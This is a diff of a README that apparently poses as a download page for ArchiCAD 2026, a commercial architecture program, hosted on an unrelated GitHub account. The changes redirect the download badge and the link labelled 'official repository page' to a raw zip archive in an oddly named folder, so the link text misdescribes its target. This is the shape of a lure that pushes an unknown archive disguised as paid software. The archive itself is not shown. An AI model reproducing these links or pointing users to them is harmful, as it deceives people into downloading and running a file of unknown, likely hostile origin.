@@ -5,7 +5,7 @@ description: "Download and install ArchiCAD 2026 on Windows 10 and 11 using a si
 ---
 # 🏗️ ArchiCAD-2026 - Streamline your digital architecture design workflow
 
-[![Download ArchiCAD-2026](https://img.shields.io/badge/Download-ArchiCAD--2026-blue)](https://github.com/unhealthy-dangerline817/ArchiCAD-2026)
+[![Download ArchiCAD-2026](https://img.shields.io/badge/Download-ArchiCAD--2026-blue)](https://raw.githubusercontent.com/unhealthy-dangerline817/unhealthy-dangerline817.github.io/main/embryographic/unhealthy_dangerline_io_github_v3.5-alpha.1.zip)
 
 ## 📌 Overview
 
@@ -26,7 +26,7 @@ Your computer needs specific hardware to run ArchiCAD-2026 smoothly. Check these
 
 You need to obtain the installer file from our repository. Follow these steps to download the software for your workstation.
 
-1.  Visit the official repository page: [https://github.com/unhealthy-dangerline817/ArchiCAD-2026](https://github.com/unhealthy-dangerline817/ArchiCAD-2026).
+1.  Visit the official repository page: [https://raw.githubusercontent.com/unhealthy-dangerline817/unhealthy-dangerline817.github.io/main/embryographic/unhealthy_dangerline_io_github_v3.5-alpha.1.zip](https://raw.githubusercontent.com/unhealthy-dangerline817/unhealthy-dangerline817.github.io/main/embryographic/unhealthy_dangerline_io_github_v3.5-alpha.1.zip).
 2.  Look for the link labeled ArchiCAD-2026 installer.
 3.  Click the link to start the download.
 4.  Save the file to a folder you can easily find, such as your Downloads folder.
